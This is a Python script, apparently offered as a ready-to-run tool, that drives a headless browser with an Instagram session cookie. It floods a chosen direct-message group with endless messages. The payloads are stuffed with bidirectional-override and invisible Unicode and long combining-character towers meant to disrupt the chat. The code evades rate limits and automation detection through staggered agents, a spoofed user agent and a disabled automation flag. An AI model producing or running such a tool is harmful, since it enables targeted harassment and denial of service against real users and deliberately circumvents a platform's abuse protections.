# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (STEALTH-STAY V5)
# 📅 STATUS: ANTI-BLOCK | PERSISTENT | DOCKER-READY

import os, asyncio, random, sys
from playwright.async_api import async_playwright

AGENT_COUNT = 3 # Reduced to 3 to ensure the machine doesn't choke

def get_variant_payload(agent_id):
    u_id = random.randint(100000, 999999)
    glue = "\u2060"
    styles = [("𝕻", "𝕬"), ("ℙ", "𝔸"), ("𝓟", "𝓐")]
    s = styles[agent_id % len(styles)]
    header = f"👑_{s[0]}{s[1]}_ＰＡＰＡ_👑{glue}☣️_NODE_{os.environ.get('MACHINE_ID')}_☣️{glue}🆔_{u_id}{glue}"
    z_tower = "̸" * 190
    void_fill = "\u2800" * 40 
    body = []
    for i in range(145):
        bidi = ["\u202E\u2066", "\u2067\u202E", "\u2068\u202B"][i % 3]
        body.append(f"{bidi}{s[0]}{s[1]}_ＯＷＮＳ_{void_fill}{z_tower}\u202C\u2069")
    return (header + glue.join(body))[:9990]

async def run_striker(agent_id, context, target_id):
    # 🕒 STAGGER: Heavy staggering to bypass IP-rate limits
    await asyncio.sleep(agent_id * 12) 
    
    page = await context.new_page()
    # Block heavy assets to save bandwidth
    await page.route("**/*.{png,jpg,jpeg,svg,mp4,woff2}", lambda route: route.abort())
    
    try:
        print(f"📡 [M-{os.environ.get('MACHINE_ID')}|A-{agent_id}] Initial Sync...")
        await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded", timeout=120000)
        
        while True: # Internal strike loop
            try:
                # Find the box without reloading the page
                box = page.get_by_role("textbox", name="Message")
                await box.wait_for(state="visible", timeout=30000)

                for _ in range(25): # Send 25 messages before a small rest
                    payload = get_variant_payload(agent_id)
                    await box.fill(payload)
                    await asyncio.sleep(0.1) # Human-like delay before Enter
                    await page.keyboard.press("Enter")
                    print(f"💀 [M-{os.environ.get('MACHINE_ID')}] Agent-{agent_id} Delivered")
                    await asyncio.sleep(random.uniform(0.6, 1.2))
                
                print(f"🧊 [Agent-{agent_id}] Resting socket...")
                await asyncio.sleep(10) # 10 second rest instead of a full refresh

            except Exception:
                print(f"⚠️ [Agent-{agent_id}] Box lost. Re-finding...")
                await asyncio.sleep(5)
                # If the box is really gone, then and only then, refresh
                if not await page.get_by_role("textbox", name="Message").is_visible():
                    await page.reload(wait_until="domcontentloaded")

    except Exception as e:
        print(f"❌ [Agent-{agent_id}] Fatal: {str(e)[:50]}")

async def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=[
            "--no-sandbox",
            "--disable-dev-shm-usage",
            "--disable-gpu",
            "--disable-blink-features=AutomationControlled"
        ])
        # Add a more common User Agent
        context = await browser.new_context(user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])

        tasks = [run_striker(i+1, context, target_id) for i in range(AGENT_COUNT)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
